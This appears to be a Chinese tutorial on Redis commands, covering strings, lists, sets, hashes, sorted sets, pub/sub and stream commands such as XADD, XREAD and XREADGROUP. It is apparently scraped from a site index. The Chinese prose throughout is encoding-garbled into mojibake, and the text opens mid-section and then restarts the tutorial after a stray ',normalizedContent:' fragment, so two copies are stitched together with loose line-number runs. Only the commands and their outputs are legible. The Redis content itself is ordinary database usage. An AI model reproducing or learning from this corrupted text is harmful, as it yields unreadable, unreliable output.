STREAMS key [key â¦] ID [ID â¦]\n   å¾ææ¾ï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥å®ç°ç¬¬ 2 ä¸ªæ¨¡å¼ï¼å³çå¬æ¨¡å¼ãå¶ä½ç¨æ¯è¿å streams ä¸­ä»æ¥æ²¡æè¯»åçï¼ä¸æ¯åæ° ID æ´å¤§çåç´ ã\n   è¿éæå¼äºä¸¤ä¸ªçªå£æµè¯ï¼ä¸ç¬¬ä¸ä¸ªæ²¡æåæ°å¢ï¼ç¬¬äºä¸ªåäºæ°å¢.\n\n127.0.0.1:6379> XREAD COUNT 10 BLOCK 60000 STREAMS user 1594458356220-0\n\n\n\n(nil)\n(60.02s)\n\n\n1\n2\n3\n4\n5\n6\n\n\n127.0.0.1:6379> XREAD COUNT 10 BLOCK 60000 STREAMS user 1594458356220-0\n1) 1) "user"\n   2) 1) 1) "1594458985980-0"\n         2) 1) "name"\n            2) "ceshi"\n(13.37s)\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nä½¿ç¨ xread ä¼é»å¡ç¹å®æ¶é´ï¼ç­å¾æ¯æ ID å¤§çæ°æ®ï¼å¦æä½¿ç¨æå° ID è¿è¡æµè¯ï¼ä¼è· xrange user - + æææ¯ä¸æ ·çã\n\næ³¨æï¼BLOCK ä¸º 0 è¡¨ç¤ºä¸è´ç­å¾ç¥éææ°çæ°æ®ï¼å¦åæ°¸è¿ä¸ä¼è¶æ¶ãå¹¶ä¸ ID çå¼æä»¬ç¨ç¹æ®å­ç¬¦ $ è¡¨ç¤ºï¼è¿ä¸ªç¹æ®å­ç¬¦è¡¨ç¤ºæä»¬åªè·åææ°æ·»å çæ¶æ¯ã\n\n127.0.0.1:6379> xread count 10 block 0 streams user $\n\n\n\n\n1\n2\n3\n\n\nxread è¿æ¯æåæ¶çå¬å¤ä¸ª streams\n\n127.0.0.1:6379> XREAD BLOCK 0 STREAMS user_01 user_02 user_03 user_04  $ $ $ $\n\n\n\n\n\n1\n2\n3\n4\n\n\nXREAD é¤äº COUNT å BLOCKï¼æ²¡æå¶ä»éé¡¹äºãææ XREAD æ¯ä¸ä¸ªéå¸¸åºæ¬çå½ä»¤ãæ´å¤é«çº§ç¹æ§å¯ä»¥å¾ä¸çæ¥ä¸æ¥è¦ä»ç»ç XREADGROUPã\n\nXREADGROUP\n\n * ç¨æ³ï¼XREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] STREAMS key [key â¦] ID [ID â¦]\n   å¾ææ¾ï¼è¿å°±æ¯ç¬¬ä¸ç§æ¨¡å¼ï¼æ¶è´¹èç»æ¨¡å¼ã\n * å¦æä½ äºè§£ kafka çæ¶è´¹èç»ï¼é£ä¹ä½ å°±ä¹äºè§£äº streams çæ¶è´¹èç»ãå¦æä¸äºè§£ä¹æ²¡å³ç³»ï¼ç¬èç®åè§£éä¸ä¸ï¼åè®¾æä¸ä¸ªæ¶è´¹è C1ï¼C2ï¼C3ãå¨ streams ä¸­æ»è®¡æ 7 æ¡æ¶æ¯ï¼1ï¼ 2ï¼ 3ï¼ 4ï¼ 5ï¼ 6ï¼ 7ï¼é£ä¹æ¶è´¹å³ç³»å¦ä¸æç¤ºï¼\n   1 -> C1\n   2 -> C2\n   3 -> C3\n   4 -> C1\n   5 -> C2\n   6 -> C3\n   7 -> C1\n * æ¶è´¹èç»å·å¤å¦ä¸å ä¸ªç¹ç¹ï¼\n   \n   * åä¸ä¸ªæ¶æ¯ä¸ä¼è¢«æéå°ä¸ä¸ªæ¶è´¹èç»ä¸çå¤ä¸ªæ¶è´¹èï¼åªå¯è½æ¯ä¸ä¸ªæ¶è´¹èã\n   \n   * åä¸ä¸ªæ¶è´¹èç»ä¸ï¼æ¯ä¸ªæ¶è´¹èé½æ¯å¯ä¸çï¼éè¿å¤§å°åææçåå­åºåã\n   \n   * æ¶è´¹èç»ä¸­çæ¶è´¹èè¯·æ±çæ¶æ¯ï¼ä¸å®æ¯æ°çï¼ä»æ¥æ²¡ææéè¿çæ¶æ¯ã\n   \n   * æ¶è´¹ä¸ä¸ªæ¶æ¯åï¼éè¦ç¨å½ä»¤ï¼XACKï¼ç¡®è®¤ï¼æææ¯è¯´ï¼è¿æ¡æ¶æ¯å·²ç»ç»æåå¤çãæ­£å ä¸ºå¦æ­¤ï¼å½è®¿é® streams çåå²æ¶æ¯æ¶ï¼æ¯ä¸ªæ¶è´¹èåªè½çå°æéç»å®èªå·±çæ¶æ¯ã\n\nXACK\n\n * ç¨æ³ï¼XACK key group ID [ID â¦]\n * è¿æ¯æ¶è´¹èç»ç¸å³çå¦ä¸ä¸ªéè¦çå½ä»¤ãæ è®°ä¸ä¸ªå¤çä¸­çæ¶æ¯ä¸ºå·²è¢«æ­£ç¡®å¤çï¼å¦æ­¤ä¸æ¥ï¼è¿æ¡æ¶æ¯å°±ä¼è¢«ä»æ¶è´¹èç»ç pending æ¶æ¯éåä¸­å é¤ï¼ç±»ä¼¼ MQ ä¸­ç ackã\n\nXGROUP\n\n * ç¨æ³ï¼xgroup create key groupname id\n * è¿ä¹æ¯æ¶è´¹èç»çä¸ä¸ªéè¦å½ä»¤ï¼è¿ä¸ªå½ä»¤ç¨æ¥ç®¡çæ¶è´¹èç»ï¼ä¾å¦åå»ºï¼å é¤ç­ã\n   XREADGROUPï¼XACKï¼XGROUP ä¸ç§å½ä»¤ææäºæ¶è´¹èç»ç¸å³çæä½å½ä»¤ã\n   ç®å XGROUP CREATE ç streams å¿é¡»æ¯ä¸ä¸ªå­å¨ç streamsï¼å¦åä¼æ¥éã\n   åå»ºä¸ä¸ªæ¶è´¹ç»\n\n127.0.0.1:6379> XGROUP CREATE user GRP-AFEI $\nOK\n\n\n1\n2\n',normalizedContent:'# å¬ç¨å½ä»¤\n\nå¯ä»¥å é¤ä»»ææ°æ®ç»æç key\n\ndel key \n\n\n1\n\n\næ¥çææ key\n\nkeys *\n\n\n1\n\n\næ ¹æ®ç»å®çéé¡¹ï¼å¯¹è¾å¥åè¡¨ãéåæèæåºéåè¿è¡æåºï¼ç¶åè¿åæèå­å¨æåºçç»æã\n\nsort source-key [by pattern] [limit offset count] [get pattern [get pattern ...]] [asc|desc] [alpha] [store dest-key] \n\n\n1\n\n\næ¥çæ°æ®åºæå¤å°ä¸ª key\n\ndbsize\n\n\n1\n\n\næ¸é¤ææåºçæ°æ®\n\nflushall\n\n\n1\n\n\næ¸é¤å½ååºçæææ°æ®\n\nflushdb\n\n\n1\n\n\næ¥ç reids åå­ä¿¡æ¯ç­\n\ninfo\n\n\n1\n\n\nçæ§ææå®¢æ·åéçå½ä»¤ï¼redis ç¼è¯æ§è¡æåçå½ä»¤ï¼\n\nmonitor\n\n\n1\n\n\n\n# å¤çæ¶é´\n\nç§»é¤é®çè¿ææ¶é´\n\npersist key \n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿æè¿æå¤å°ç§\n\nttl key \n\n\n1\n\n\nç»å®é®å¨æå®çç§æ°åè¿æ\n\nexpire key seconds \n\n\n1\n\n\nå°ç»å®é®çè¿ææ¶é´è®¾ç½®ä¸ºç»å®ç unix æ¶é´æ³\n\nexpireat key timestamp\n\n\n1\n\n\næ¥çç»å®é®è·ç¦»è¿ææ¶é´è¿æå¤å°æ¯«ç§ï¼è¿ä¸ªå½ä»¤å¨ reids2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npttl key \n\n\n1\n\n\nè®©ç»å®é®å¨æå®çæ¯«ç§æ°ä¹åè¿æï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpire key milliseconds \n\n\n1\n\n\nå°ä¸ä¸ªæ¯«ç§çº§ç²¾åº¦ç unix æ¶é´æ³è®¾ç½®ä¸ºç»å®é®çè¿ææ¶é´ï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨ã\n\npexpireat key timestamp-milliseconds \n\n\n1\n\n\n\n# èªå¢åèªå\n\nå°é®å­å¨çå¼ + 1\n\nincr key \n\n\n1\n\n\nå°é®å­å¨çå¼ - 1\n\ndecr key \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æ´æ° amount\n\nincrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼åå»æ´æ° amount\n\ndecrby key amount \n\n\n1\n\n\nå°é®å­å¨çå¼å ä¸æµ®ç¹æ° amountï¼è¿ä¸ªå½ä»¤å¨ redis2.6 ä»¥ä¸çæ¬å¯ç¨\n\nincrbyfloat key amount \n\n\n1\n\n\n\n# å­ç¬¦ä¸² string\n\nå¯ä»¥æ¯å­ç¬¦ä¸²ï¼ç®åçå­ç¬¦ä¸²ãå¤æçå­ç¬¦ä¸²ï¼ä¾å¦ jsonãxmlï¼ï¼ãæ°å­ï¼æ´æ°ãæµ®ç¹æ°ï¼ï¼çè³æ¯äºè¿å¶ï¼å¾çãé³é¢ãè§é¢ï¼ï¼ä½æ¯å¼æå¤§ä¸è½è¶è¿ 512mb\n\nåå»ºä¸ä¸ªé®å¼å¯¹ set key value\n\n127.0.0.1:6379> set a 1234567890\nok\n\n\n1\n2\n\n\nè·å key å­å¨çå¼ get key\n\n127.0.0.1:6379> get a\n"1234567890"\n\n\n1\n2\n\n\nå°å¼ value è¿½å å°ç»å® key å½åå­å¨çå¼çæ«å°¾ï¼è¿½å æåçåè¿åå¼ä¸ºè¿ä¸ªå­ç¬¦ä¸²çé¿åº¦ (length) append key value\n\n127.0.0.1:6379> append a a\n(integer) 11\n127.0.0.1:6379> get a\n"1234567890a"\n\n\n1\n2\n3\n4\n\n\nè·åä¸ä¸ªç±åç§»é start è³ end èå´åçææå­ç¬¦ç»æçå­ä¸²ï¼åæ¬ start å end å¨åãgetrange key start end\n\n127.0.0.1:6379> getrange a 0 3\n"1234"\n\n\n1\n2\n\n\nå°ä» start åç§»éå¼å§çå­ä¸²è®¾ç½®ä¸ºç»å®å¼ setrange key offset value\n\n127.0.0.1:6379> setrange a 3 bcde\n(integer) 11\n127.0.0.1:6379> get a\n"123bcde890a"\n\n\n1\n2\n3\n4\n\n\n\n# åè¡¨ list\n\nç¨æ¥å­å¨å¤ä¸ªæåºçå­ç¬¦ä¸²ï¼åè¡¨ä¸­çæ¯ä¸ªå­ç¬¦ä¸²ç§°ä¸ºåç´ ï¼elementï¼ï¼ä¸ä¸ªåè¡¨æå¤å¯ä»¥å­å¨ 2^32 -1 ä¸ªåç´ \n\nå°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå³ç«¯ rpush key value [...]\n\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n127.0.0.1:6379> rpush b 7 8\n(integer) 4\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n3) "7"\n4) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\nè·å list åç´ æ°é llen\n\n127.0.0.1:6379[1]> llen 32021420001:90000300009999:10002:1601198414621\n(integer) 2\n\n\n1\n2\n\n\nlpush key value [...] -> å°ä¸ä¸ªæå¤ä¸ªå¼æ¨å¥åè¡¨çå·¦ç«¯\n\n127.0.0.1:6379> lpush b 1 2\n(integer) 6\n127.0.0.1:6379> lrange b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n6) "8"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nrpop key -> ç§»é¤å¹¶è¿ååè¡¨æå³ç«¯çåç´ \n\n127.0.0.1:6379> rpop b\n"8"\n127.0.0.1:6379> lrange b 0 -1\n1) "2"\n2) "1"\n3) "5"\n4) "6"\n5) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nlpop key -> ç§»é¤å¹¶è¿ååè¡¨æå·¦ç«¯çåç´ \n\n127.0.0.1:6379> lpop b\n"2"\n127.0.0.1:6379> lrange b 0 -1\n1) "1"\n2) "5"\n3) "6"\n4) "7"\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nlindex key offset -> è¿ååè¡¨ä¸­åç§»éä¸º offset çåç´  (ä¸æ ä» 0 å¼å§)\n\n127.0.0.1:6379> lindex b 3\n"7"\n\n\n1\n2\n\n\nlrange key start end -> è¿ååè¡¨ä» start åç§»éå° end åç§»éèå´çææåç´ ãåå« start å end æ¬èº«ãlrange key 0 -1 ä¸ºæ¥è¯¢ææ\n\n127.0.0.1:6379> lrange b 0 2\n1) "1"\n2) "5"\n3) "6"\n\n\n1\n2\n3\n4\n\n\nltrim key start end -> å¯¹åè¡¨è¿è¡ä¿®é®ï¼åªä¿çä» start è³ end åç§»éçåç´ ï¼åå« start å endã\n\n127.0.0.1:6379> ltrim b 1 2\nok\n127.0.0.1:6379> lrange b 0 -1\n1) "5"\n2) "6"\n\n\n1\n2\n3\n4\n5\n\n\nblpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå·¦ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> blpop c 10\n(nil)\n(10.03s)\n\n\n1\n2\n3\n\n\nbrpop key [...] timeout -> ä»ç¬¬ä¸ä¸ªéç©ºåè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼æèå¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç° (ä¸ä¸æµè¯æ²¡æåç´ æä»¥ nil)\n\n127.0.0.1:6379> brpop c 10\n(nil)\n(10.07s)\n\n\n1\n2\n3\n\n\nrpoplpush source-key dest-key -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ \n\nbrpoplpush source-key dest-key timeout -> ä» source-key åè¡¨ä¸­å¼¹åºä½äºæå³ç«¯çåç´ ï¼ç¶åå°è¿ä¸ªåç´ æ¨å¥ dest-key åè¡¨çæå·¦ç«¯ï¼å¹¶åç¨æ·è¿åè¿ä¸ªåç´ ï¼å¦æ source-key ä¸ºç©ºï¼é£ä¹å¨ timeout ç§ä¹åé»å¡å¹¶ç­å¾å¯å¼¹åºçåç´ åºç°ã\n\n\n# éå set\n\nç¨æ¥ä¿å­å¤ä¸ªçå­ç¬¦ä¸²åç´ ï¼ä½ååè¡¨ç±»åä¸ä¸æ ·çæ¯ï¼éåä¸­ä¸åè®¸æéå¤åç´ ï¼å¹¶ä¸éåä¸­çåç´ æ¯æ åºçï¼ä¸è½éè¿ç´¢å¼ä¸æ è·ååç´ \n\nsadd key item[...] -> å°ä¸ä¸ªæå¤ä¸ªåç´ æ·»å å°éåéé¢ï¼å¹¶è¿åè¢«æ·»å åç´ å½ä¸­åæ¬å¹¶ä¸å­å¨äºéåéé¢çåç´ æ°éã\n\nsrem key item[...] -> ä»éåéé¢å é¤ä¸ä¸ªæå¤ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤åç´ çæ°éã\n\nsismember key item -> æ£æ¥åç´ itemæ¯å¦å­å¨äºéåkeyéé¢ã\n\nscard key -> è¿åéååå«çåç´ æ°éã\n\nsmembers key -> è¿åéååå«çææåç´ ã\n\nsrandmember key [count] -> ä»éåééæºçè¿åä¸ä¸ªæå¤ä¸ªåç´ ï¼å½count ä¸ºæ­£æ´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ ä¸ä¼éå¤ï¼å½countä¸ºè´æ°æ¶ï¼å½ä»¤è¿åçéæºåç´ å¯è½ä¼åºç°éå¤ã\n\nspop key -> éæºçç§»é¤éåä¸­çä¸ä¸ªåç´ ï¼å¹¶è¿åè¢«ç§»é¤çåç´ ã\n\nsmove source-key dest-key item -> å¦æéåsource-keyåå«åç´ itemï¼é£ä¹ä»éåsource-key éé¢ç§»é¤yåç´ itemï¼å¹¶å°åç´ itemæ·»å å°éådest-keyä¸­ï¼å¦æitemæåç§»é¤ï¼é£ä¹å½ä»¤è¿å1ï¼å¦åè¿å0ï¼\n\nsdiff key[...] -> è¿åé£äºå­å¨äºç¬¬ä¸ä¸ªéåãä½ä¸å­å¨äºå¶ä»éåä¸­çåç´ (æ°å­¦ä¸çå·®éè¿ç®)\n\nsdiffstore dest-key key[...] -> å°é£äºå­å¨äºç¬¬ä¸ä¸ªéåä½ä¸å­å¨äºå¶ä»éåçåç´ (æ°å­¦ä¸çå·®éè¿ç®)å­å¨å°dest-key é®éé¢\n\nsinter key[...] -> è¿åé£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)\n\nsinter dest-key key[...] -> é£äºåæ¶å­å¨äºææéåä¸­çåç´ (æ°å­¦ä¸çäº¤éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\nsunion key[...] -> è¿åé£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)\n\nsunionstore dest-key key[...] -> é£äºè³å°å­å¨äºä¸ä¸ªéåä¸­çåç´ (æ°å­¦ä¸è®²çå¹¶éè¿ç®)å­å¨å°dest-keyé®éé¢ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# æ£å hash åå¸ç±»å\n\n\nhset key-name key value -> åå»ºä¸ä¸ªæ£åå¹¶èµå¼\n\nhget key-name key -> è¿åæå®æ£åé®çå¼\n\nhgetall key-name -> è·åæ£ååå«çææé®å¼å¯¹\n\nhmset key-name key value[key value ...] -> ä¸ºæ£åéé¢çä¸ä¸ªæå¤ä¸ªé®è®¾ç½®å¼\n\nhmget key-name key[...] -> ä»æ£åéé¢è·åä¸ä¸ªæå¤ä¸ªé®çå¼\n\nhlen key-name -> è¿åæ£ååå«çé®å¼å¯¹æ°é\n\nhdel key-name key[...] -> å é¤æ£åéé¢çä¸ä¸ªæå¤ä¸ªé®å¼å¯¹ï¼è¿åæåæ¾å°å¹¶å é¤çé®å¼å¯¹æ°éã\n\nhexists key-name key -> æ£æ¥ç»å®çé®æ¯å¦å­å¨äºæ£åä¸­\n\nhkeys key-name -> è·åæ£ååå«çææé®\n\nhvals key-name -> è·åæ£ååå«çææå¼\n\nhincrby key-name key increment -> å°é®keyå­å¨çå¼å ä¸æ´æ°increment\n\nhincrbyfloat key-name key increment -> å°é®keyå­å¨çå¼å ä¸æµ®ç¹æ°increment\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n\n# æåºéå zset\n\nä¸è½æéå¤çåç´ ï¼èä¸è¿å¯ä»¥æåºï¼å®ååè¡¨ä½¿ç¨ç´¢å¼ä¸æ ä½ä¸ºæåºä¾æ®ä¸åçæ¯ï¼å®ç»æ¯ä¸ªåç´ è®¾ç½®ä¸ä¸ªåæ° (score) ä½ä¸ºæåºçä¾æ®ï¼é»è®¤ååºï¼\n\n\nzadd key score member [score member ...] -> å°å¸¦æç»å®åå¼çæåæ·»å å°æåºéåéé¢\n\nzrem key member[...] -> ä»æåºéåéé¢ç§»é¤ç»å®çæåï¼å¹¶è¿åè¢«ç§»é¤æåçæ°é\n\nzcard key -> è¿åæåºéååå«çæåæ°é\n\nzincrby key increment member -> å°memberæåçåå¼å ä¸increment\n\nzcount key min max -> è¿ååå¼ä»äºmin åmax ä¹é´çæåæ°é\n\nzrank key member -> è¿åæåmemberå¨æåºéåä¸­çæå\n\nzscore key member -> è¿åæåmemberçåå¼\n\nzrange key start stop [withscores] -> è¿åæåºéåä¸­æåä»äºstart å stop ä¹é´çæåï¼å¦æç»å®äºå¯éç withscores éé¡¹ï¼é£ä¹ä¼å°æåçåå¼ä¸å¹¶è¿åãzrange key 0 -1 æ¥è¯¢æææå\n\nzrevrank key member -> è¿åæåºéåéæåmemberçæåï¼æåæç§åå¼ä»å¤§å°å°æå\n\nzrevrange key start stop [withscores] -> è¿åæåºéåç»å®æåèå´åçæåï¼æç§åå¼ä»å¤§å°å°æå\n\nzrangebyscore key min max [withscores] [left offset count] -> è¿åæåºéåä¸­ï¼åå¼ä»äºminåmaxä¹é´çæææå\n\nzrevrangebyscore key max min [withscores] [left offset count] -> è·åæåºéåä¸­åå¼ä»äºminåmaxä¹é´çæææåï¼å¹¶æç§åå¼ä»å¤§å°å°çé¡ºåºæ¥è¿åä»ä»¬ã\n\nzremrangebyrank key start top -> ç§»é¤æåºéåä¸­æåä»äºstart å stop ä¹é´çæåã\n\nzremrangebyscore key min max -> ç§»é¤æåºéåä¸­åå¼ä»äºminåmax ä¹é´çæåã\n\nzinterstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹ç»å®çæåºéåæ§è¡ç±»ä¼¼äºéåçäº¤éè¿ç®\n\nzunionstore dest-key key-count key[...] [weights weight[...] ] [aggregate sum|min|max] -> å¯¹æå®çæåºéåæ§è¡ç±»ä¼¼äºéåçå¹¶éè¿ç®\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# è®¢é / åå¸\n\n\nsubscribe channel[...] -> è®¢éç»å®çä¸ä¸ªæå¤ä¸ªé¢é\n\nunsubscribe channel[...] -> éè®¢ç»å®çä¸ä¸ªæå¤ä¸ªé¢éï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½é¢éï¼é£ä¹éè®¢ææé¢é\n\npublish channel message -> åç»å®çé¢éåéæ¶æ¯\n\npsubscribe pattern[...] -> è®¢éä¸ç»å®æ¨¡å¼ç¸å¹éçææé¢é\n\npunsubscribe pattern[...] -> éè®¢ç»å®çæ¨¡å¼ï¼å¦ææ§è¡æ¶æ²¡æç»å®ä»»ä½æ¨¡å¼ï¼é£ä¹éè®¢æææ¨¡å¼ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# redis5 ä¹ streams æ°æ®ç±»å\n\nredis 5.0 å¨æ°çæ°æ®ç±»åï¼streamsï¼å®æ¹æå®å®ä¹ä¸ºï¼ä»¥æ´æ½è±¡çæ¹å¼å»ºæ¨¡æ¥å¿çæ°æ®ç»æãredis ç streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼è³å°å¨æ¦å¿µä¸å®æ¯ä¸ç§å¨åå­ä¸­è¡¨ç¤ºçæ½è±¡æ°æ®ç±»åï¼åªä¸è¿å®ä»¬å®ç°äºæ´å¼ºå¤§çæä½ï¼ä»¥åææ¥å¿æä»¶æ¬èº«çéå¶ã\n\nå¦æä½ äºè§£ mqï¼é£ä¹å¯ä»¥æ streams å½å mqãå¦æä½ è¿äºè§£ kafkaï¼é£ä¹çè³å¯ä»¥æ streams å½å kafkaã\n\nå¦å¤ï¼è¿ä¸ªåè½æç¹ç±»ä¼¼äº redis ä»¥åç pub/subï¼ä½æ¯ä¹æåºæ¬çä¸åï¼\n\n * streams æ¯æå¤ä¸ªå®¢æ·ç«¯ï¼æ¶è´¹èï¼ç­å¾æ°æ®ï¼linux ç¯å¢å¼å¤ä¸ªçªå£æ§è¡ xread å³å¯æ¨¡æï¼ï¼å¹¶ä¸æ¯ä¸ªå®¢æ·ç«¯å¾å°çæ¯å®å¨ç¸åçæ°æ®ã\n\n * pub/sub æ¯åéå¿è®°çæ¹å¼ï¼å¹¶ä¸ä¸å­å¨ä»»ä½æ°æ®ï¼è streams æ¨¡å¼ä¸ï¼æææ¶æ¯è¢«æ éæè¿½å å¨ streams ä¸­ï¼é¤éç¨äºæ¾ç¤ºæ§è¡å é¤ï¼xdelï¼ã\n\n * streams ç consumer groups ä¹æ¯ pub/sub æ æ³å®ç°çæ§å¶æ¹å¼ã\n\n\n# streams æ°æ®ç»æ\n\nstreams æ°æ®ç»ææ¬èº«éå¸¸ç®åï¼ä½æ¯ streams ä¾ç¶æ¯ redis å°ç®åä¸ºæ­¢æå¤æçç±»åï¼å¶åå æ¯å®ç°çä¸äºé¢å¤çåè½ï¼ä¸ç³»åçé»å¡æä½åè®¸æ¶è´¹èç­å¾çäº§èå å¥å° streams çæ°æ°æ®ãå¦å¤è¿æä¸ä¸ªç§°ä¸º consumer groups (æ¶è´¹ç») çæ¦å¿µï¼è¿ä¸ªæ¦å¿µæåç± kafka æåºï¼redis æä¸ä¸ªç±»ä¼¼å®ç°ï¼å kafka ç consumer groups çç®çæ¯ä¸æ ·çï¼åè®¸ä¸ç»å®¢æ·ç«¯åè°æ¶è´¹ç¸åçä¿¡æ¯æµï¼\n\n\n# streams åºç¡\n\nä¸ºäºçè§£ streams çç®çï¼ä»¥åå¦ä½ä½¿ç¨å®ï¼æä»¬åå¿½ç¥æææé«çº§ç¹æ§ï¼åªææ³¨æåæ¾å¨æ°æ®ç»ææ¬èº«ï¼ä»¥åé£äºæä½åè®¿é® streams çå½ä»¤ãè¿åºæ¬ä¸ä¹æ¯å¤§å¤æ°å¶ä» redis æ°æ®ç±»åå±æçé¨åï¼ä¾å¦ listsï¼setsï¼sorted sets ç­ãç¶èéè¦æ³¨æçæ¯ï¼lists ä¹æä¸ä¸ªæ´å¤æçé»å¡å¼ç apiï¼ä¾å¦ blpopï¼brpop ç­ãstreams è¿æ¹ä¾¿ç api ä¹æ²¡ä»ä¹ä¸åï¼åªæ¯æ´å¤æï¼æ´å¼ºå¤§ï¼æ´çé¼ï¼åï¼ï¼\n\n\n# streams å½ä»¤\n\nåºè¯ä¸å¤è¯´ï¼åä¸æç©ç©è¿ä¸ªå¨æ°çæ°æ®ç±»åãstreams è¿ä¸ªæ°æ®ç±»åå¯¹åºæå¦ä¸ 13 ä¸ªæä½å½ä»¤ï¼ææå½ä»¤é½ä»¥ "x" å¼å¤´ï¼\nxadd\n\n * ç¨æ³ï¼xadd key id field string [field string â¦]\n\n * æ­£å¦å¶åï¼è¿ä¸ªå½ä»¤å°±æ¯ç¨æ¥æ·»å çï¼ç» streams è¿½å ï¼appendï¼åé¢æå°è¿ï¼streams ä¸»è¦æ¯ä¸ä¸ª append only çæ°æ®ç»æï¼ä¸ä¸ªæ°ç entryï¼å java éç map ç±»ä¼¼ï¼redis éç streams ä¸­çæ°æ®ä¹ç§°ä¸º entryï¼ã\n\n * keyï¼çå«ä¹å°±æ¯åä¸ç±»å streams çåç§°ï¼\n\n * id: streams ä¸­ entry çå¯ä¸æ è¯ç¬¦ï¼å¦ææ§è¡ xadd å½ä»¤æ¶ï¼ä¼ å¥æå·ï¼*ï¼ï¼é£ä¹ï¼id ä¼èªå¨çæï¼ä¸èªå¨çæç id ä¼å¨æ§è¡ xadd åè¿åï¼é»è®¤çæç id æ ¼å¼ä¸º millisecondstime+sequencenumberï¼å³å½åæ¯«ç§çº§å«çæ¶é´æ³å ä¸ä¸ä¸ªèªå¢åºå·å¼ï¼ä¾å¦ "1540013735401-0"ãå¹¶ä¸æ§è¡ xadd æ¶ï¼ä¸æ¥åå°äºæç­äºä¸ä¸æ¬¡æ§è¡ xadd ç idï¼å¦åä¼æ¥éï¼err the id specified in xadd is equal or smaller than the target stream top itemï¼\n\n * field&stringï¼æ¥ä¸æ¥å°±æ¯è¥å¹²ç» field stringãå¯ä»¥æå®çè§£ä¸ºè¡¨ç¤ºå±æ§ç json ä¸­ç key-valueãä¾å¦ï¼æä¸ streams ç key å½åä¸º userinfoï¼ä¸æä¸ªç¨æ·ä¿¡æ¯ä¸º {"username":"afei", "password":"123456"}ï¼é£ä¹æ§è¡ xadd å½ä»¤å¦ä¸ï¼\n\n127.0.0.1:6379> xadd userinfo * name afei password 123456\n"1594456377383-0"\n127.0.0.1:6379> \n\n\n1\n2\n3\n\n\nç±äºå½ä»¤ä¸­ id å­æ®µçå¼æ¯ * ï¼æä»¥èªå®çæ idï¼1594456377383-0 å°±æ¯èªå¨çæç idã xadd å½ä»¤ä¹æ¯ææ¾ç¤ºæå® idï¼ä¾å¦ï¼xadd key 0-2 field stringã\n\néè¦æ³¨æçæ¯ï¼id çæ¶é´æ³é¨åæ¯é¨ç½² redis æå¡å¨çæ¬å°æ¶é´ï¼å¦æåçæ¶éåæ¨ä¼æä¹æ ·ï¼å¦æåçæ¶éåæ¨ï¼çæç id çæ¶é´æ³é¨åå°±æ¯åæ¨åçæ¶é´ï¼ç¶åå ä¸è¿ä¸ªæ¶é´çéå¢åºåå·ãä¾å¦å½åæ¶é´æ³ 1540014082060ï¼ç¶åè¿æ¶ååçäºæ¶éåæ¨ï¼ä¸åæ¨ 5msï¼é£ä¹æ¶é´æ³å°±æ¯ 1540014082055ãåè®¾ä»¥åå·²ç»çæäº 1540014082055-0ï¼1540014082055-1ï¼é£ä¹è¿æ¬¡ç±äºæ¶éåæ¨ï¼çæç id å°±æ¯ 1540014082055-2ãæä»¥åè®¸èªå¨çæç id å¨åçæ¶éåæ¨æ¶å°äºä¸æ¬¡ç idï¼ä½æ¯ä¸åè®¸æ¾ç¤ºæå®ä¸ä¸ªå°äºä¸æ¬¡ç idã\n\nå¦ææä»¬ä»¥ç¸åç key æå¥ä¸éï¼ä»ä¸ä¼åæ®éç key-value ä¸æ ·åæ¿æ¢ï¼èæ¯å¨ç¸å key ç»´æ¤è¿ä¸ä¸ªåè¡¨ã\n\nxdel\n\n * ç¨æ³ï¼xdel key id [id â¦]\n   å xadd 